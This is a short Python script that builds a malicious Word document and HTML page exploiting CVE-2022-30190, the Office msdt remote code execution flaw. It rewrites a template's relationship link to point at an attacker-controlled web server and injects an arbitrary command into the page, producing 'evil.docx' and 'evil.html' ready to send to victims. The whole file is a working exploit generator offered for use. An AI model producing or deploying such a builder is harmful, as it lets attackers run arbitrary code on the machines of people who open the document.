import sys
import os
import shutil


def create_evil_page():
    file = open("templates/page.html", 'r')
    filedata = file.read()
    file.close()

    filedata = filedata.replace('COMMAND', command)
    # Write the file out again
    file = open("evil.html", 'w')
    file.write(filedata)
    file.close()


# .docx file with Frameset attack
def create_docx(server, filename):
    # Source path
    src = os.path.join("templates", "office")
    # Destination path
    dest = os.path.join("output")
    # Copy the content of
    # source to destination
    shutil.copytree(src, dest)
    documentfilename = os.path.join("output", "word", "_rels", "document.xml.rels")
    # Read the template file
    file = open(documentfilename, 'r')
    filedata = file.read()
    file.close()
    # Replace the target string
    filedata = filedata.replace('http://127.0.0.1/test.html', server)
    # Write the file out again
    file = open(documentfilename, 'w')
    file.write(filedata)
    file.close()
    shutil.make_archive(filename, 'zip', "output")
    os.rename(filename + ".zip", filename + ".docx")
    shutil.rmtree("output")


if __name__ == '__main__':
    # CVE-2022-30190 Office msdt Remote code execute 0day.

    if len(sys.argv) != 3:
        print("Usage: <web_server url> <command>")
        sys.exit("e.g. http://10.0.0.1/evil.html calc.exe")

    ip = sys.argv[1]
    command = sys.argv[2]

    create_docx(ip, "evil")

    create_evil_page()

    print("created evil.html and evil.docx")
